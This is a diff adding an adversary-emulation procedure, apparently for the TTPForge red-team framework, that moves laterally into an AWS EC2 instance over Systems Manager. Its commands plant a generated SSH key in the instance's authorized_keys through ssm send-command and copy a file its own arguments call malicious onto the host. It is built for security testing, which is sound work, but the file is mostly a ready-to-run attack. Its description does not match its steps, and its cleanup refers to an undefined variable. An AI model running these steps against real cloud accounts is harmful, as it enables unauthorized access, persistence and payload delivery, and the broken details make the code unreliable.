@@ -1,0 +1,53 @@
+---
+api_version: 2.0
+uuid: e16a4985-cd03-419f-a6de-9a9d5037f7f0
+name: copy_file_over_ssm
+authors:
+  - sidw
+description: |
+  This action will install required cloud tools, set necessary cloud env variables and proxy env variables.
+
+args:
+  - name: ec2_instance_id
+    description: The instance ID of the EC2 to which the malicious file must be downloaded.
+  - name: aws_region
+    description: the AWS region the EC2 is in, defaults to us-west-2
+  - name: file_to_copy
+    description: |
+      Fully qualified path(s) of the file(s) that needs to be copied.
+      Full path to each file must be provided here, seperated by a space.
+
+mitre:
+  tactics:
+    - TA0008 Lateral Movement
+  techniques:
+    - T1021 Remote Services
+  subtechniques:
+    - T1021.007 Cloud Services
+
+steps:
+  - name: create_ssh_config
+    description: Create a temporary ssh configuration file to use ssm to EC2 instances.
+    create_file: /tmp/ttpforge_ssh_config
+    contents: |
+      # SSH over Session Manager
+      host i-* mi-*
+        ProxyCommand sh -c "aws ssm start-session --region {{.Args.aws_region}} --target %h --document-name AWS-StartSSHSession --parameters portNumber=%p"
+    cleanup: default
+
+  - name: generate_key
+    description: Generate a temporary public/private key pair to authenticate to EC2.
+    inline:  |
+      ssh-keygen -N "" -f ~/.ssh/exfil_to_aws_ec2 <<<y >/dev/null 2>&1
+    cleanup:
+      inline: rm ~/.ssh/exfil_to_aws_ec2 && rm ~/.ssh/exfil_to_aws_ec2.pub
+
+  - name: copy_file_to_ec2
+    description: Copy
+    inline: |
+      export PUBLIC_KEY=$(cat ~/.ssh/exfil_to_aws_ec2.pub)
+
+      aws ssm send-command --region {{.Args.aws_region}} --instance-ids {{.Args.ec2_instance_id}} --document-name "AWS-RunShellScript" --parameters commands=["sudo su ubuntu && echo $PUBLIC_KEY >> /home/ubuntu/.ssh/authorized_keys"] > /dev/null
+      scp -F /tmp/ttpforge_ssh_config -i ~/.ssh/exfil_to_aws_ec2 {{.Args.file_to_copy}} ubuntu@{{ .Args.ec2_instance_id}}:/tmp/
+    cleanup:
+      inline: aws ssm send-command --region {{.Args.aws_region}} --instance-ids {{.Args.ec2_instance_id}} --document-name "AWS-RunShellScript" --parameters commands=["rm /tmp/$FILENAME"] > /dev/null
